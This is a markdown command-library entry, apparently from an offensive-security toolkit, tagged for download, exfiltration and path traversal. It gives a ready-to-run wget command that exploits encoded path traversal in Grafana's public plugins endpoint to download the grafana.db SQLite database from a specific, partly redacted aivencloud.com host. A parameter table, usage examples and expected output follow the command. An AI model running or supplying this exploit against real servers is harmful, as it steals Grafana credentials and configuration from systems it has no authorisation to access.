---
id: cmd-wget-sqlite-db
data: >-
  wget -L -O ~/Downloads/grafana.db
  https://grafana-303ca6f8-████.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar/lib/grafana/grafana.db
tags:
  - download
  - exfil
  - path-traversal
type: command
output: Downloaded file grafana.db
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:27.748Z'
verified: false
validated: true
submitted: true
---
# wget-download-sqlite-db

## Command

```bash
wget -L -O ~/Downloads/grafana.db https://grafana-303ca6f8-████.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar/lib/grafana/grafana.db
```

## Description

Downloads the Grafana SQLite database using path traversal in the URL, following redirects and saving to a local file.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -L | Follow HTTP redirects | Yes |
| -O | Output file path | Yes |
| URL | Traversal path to grafana.db | Yes |

## Examples

### Basic Usage

```bash
wget -L -O grafana.db https://grafana-303ca6f8-████.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar/lib/grafana/grafana.db
```

### Advanced Usage

With verbose logging:

```bash
wget -L -v -O ~/Downloads/grafana.db https://...
```

## Expected Output

SQLite database file downloaded, ready for local analysis.

## Related

- [[Related Procedure: Download-and-Query-Grafana-SQLite-Database]]
